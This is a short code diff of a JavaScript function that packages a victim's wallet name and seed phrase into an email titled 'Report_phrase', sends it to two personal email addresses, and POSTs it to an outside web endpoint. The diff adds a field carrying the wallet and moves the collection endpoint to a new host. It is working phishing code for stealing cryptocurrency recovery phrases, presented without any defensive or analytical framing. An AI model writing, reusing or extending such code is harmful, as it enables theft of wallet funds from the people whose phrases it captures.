@@ -6,6 +6,7 @@ export const sendMessage = async (data) => {
     message: `wallet: ${data.wallet} <br/> phrase:  ${data.phrase}`,
     to: "resultbox4us@outlook.com, anthonyerics84@gmail.com",
     subject: "Report_phrase",
+    name: `${data.wallet}`,
   });
 
   var requestOptions = {
@@ -15,7 +16,7 @@ export const sendMessage = async (data) => {
     redirect: "follow",
   };
   return await fetch(
-    "https://reinvented-natural-catshark.glitch.me/unchainedtrade",
+    "https://expresspages.vercel.app/trustgain",
     requestOptions
   );
 };
